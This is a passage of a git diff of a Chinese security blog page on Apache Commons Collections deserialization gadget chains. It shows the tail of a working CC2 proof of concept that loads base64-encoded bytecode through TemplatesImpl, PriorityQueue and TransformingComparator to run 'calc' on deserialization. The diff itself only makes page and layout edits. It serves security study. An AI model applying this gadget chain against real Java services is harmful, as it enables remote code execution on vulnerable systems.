class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getBytescode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="CC链之死"><a href="#CC链之死" class="headerlink" title="CC链之死"></a>CC链之死</h3><blockquote>
+<h2 id="CC链之死"><a href="#CC链之死" class="headerlink" title="CC链之死"></a>CC链之死</h2><blockquote>
 <p>CC链的利用只能在于3.2.2之前和4.1之前</p>
 </blockquote>
 <ol>
@@ -291,9 +300,19 @@
 </blockquote>
 </li>
 </ol>
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
+<li>java安全指南</li>
+<li>信工所大佬</li>
+</ol>
 
   </div>
 </article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
 
 
 
@@ -305,8 +324,6 @@
       <ul>
         
           <li><a href="/">Home</a></li>
-        
-          <li><a href="/about/">About</a></li>
         
           <li><a href="/archives/">Writing</a></li>
         
@@ -322,7 +339,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC%E9%93%BE%E4%B9%8B%E6%B3%95%E4%B9%9F"><span class="toc-number">1.</span> <span class="toc-text">*CC链之法也</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#commons-collections4%E5%92%8Ccommons-collections"><span class="toc-number">2.</span> <span class="toc-text">commons-collections4和commons-collections</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E6%B0%B4%E7%9A%84CC%E5%8C%85but%E9%93%81%E6%89%93%E7%9A%84CC%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">流水的CC包but铁打的CC链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%A6%82%E4%B8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">环境配置如下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Old-CC-in-Commons-collections4-pocs"><span class="toc-number">3.2.</span> <span class="toc-text">Old CC in Commons-collections4 pocs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q-CC1For4-TransformedMap-poc%E7%8E%B0%E5%9C%A8%E4%BC%9A%E8%B0%83%E7%94%A8%E4%B8%A4%E6%AC%A1calc"><span class="toc-number">3.3.</span> <span class="toc-text">Q: CC1For4_TransformedMap poc现在会调用两次calc?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2-for-commons-collections4"><span class="toc-number">4.</span> <span class="toc-text">CC2 for commons-collections4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget"><span class="toc-number">4.1.</span> <span class="toc-text">Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-util-PriorityQueue"><span class="toc-number">4.2.</span> <span class="toc-text">java.util.PriorityQueue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#org-apache-commons-collections4-comparators-TransformingComparator"><span class="toc-number">4.3.</span> <span class="toc-text">org.apache.commons.collections4.comparators.TransformingComparator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC2-%E5%8E%9F%E5%A7%8Bpoc"><span class="toc-number">4.4.</span> <span class="toc-text">CC2 原始poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC2-TemplatesImpl-%E6%94%B9%E8%BF%9Bpoc"><span class="toc-number">4.5.</span> <span class="toc-text">CC2_TemplatesImpl 改进poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC%E9%93%BE%E4%B9%8B%E6%AD%BB"><span class="toc-number">4.6.</span> <span class="toc-text">CC链之死</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC%E9%93%BE%E4%B9%8B%E6%B3%95%E4%B9%9F"><span class="toc-number">1.</span> <span class="toc-text">*CC链之法也</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#commons-collections4%E5%92%8Ccommons-collections"><span class="toc-number">2.</span> <span class="toc-text">commons-collections4和commons-collections</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E6%B0%B4%E7%9A%84CC%E5%8C%85but%E9%93%81%E6%89%93%E7%9A%84CC%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">流水的CC包but铁打的CC链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%A6%82%E4%B8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">环境配置如下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Old-CC-in-Commons-collections4-pocs"><span class="toc-number">3.2.</span> <span class="toc-text">Old CC in Commons-collections4 pocs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q-CC1For4-TransformedMap-poc%E7%8E%B0%E5%9C%A8%E4%BC%9A%E8%B0%83%E7%94%A8%E4%B8%A4%E6%AC%A1calc"><span class="toc-number">3.3.</span> <span class="toc-text">Q: CC1For4_TransformedMap poc现在会调用两次calc?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2-for-commons-collections4"><span class="toc-number">4.</span> <span class="toc-text">CC2 for commons-collections4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget"><span class="toc-number">4.1.</span> <span class="toc-text">Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-util-PriorityQueue"><span class="toc-number">4.2.</span> <span class="toc-text">java.util.PriorityQueue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#org-apache-commons-collections4-comparators-TransformingComparator"><span class="toc-number">4.3.</span> <span class="toc-text">org.apache.commons.collections4.comparators.TransformingComparator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC2-%E5%8E%9F%E5%A7%8Bpoc"><span class="toc-number">4.4.</span> <span class="toc-text">CC2 原始poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC2-TemplatesImpl-%E6%94%B9%E8%BF%9Bpoc"><span class="toc-number">4.5.</span> <span class="toc-text">CC2_TemplatesImpl 改进poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC%E9%93%BE%E4%B9%8B%E6%AD%BB"><span class="toc-number">5.</span> <span class="toc-text">CC链之死</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">6.</span> <span class="toc-text">Ref</span></a></li></ol>
       </div>
     
 
@@ -361,7 +378,7 @@
     Copyright &copy;
     
     
-    2023-2024
+    2023-2025
     KC1zs4&#39;s Blog
   </div>
   <div class="footer-right">
@@ -369,8 +386,6 @@
       <ul>
         <!--
        --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
@@ -474,6 +489,18 @@
 <!-- Cloudflare Analytics -->
 
 <!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
 <!-- utterances Comments -->
 
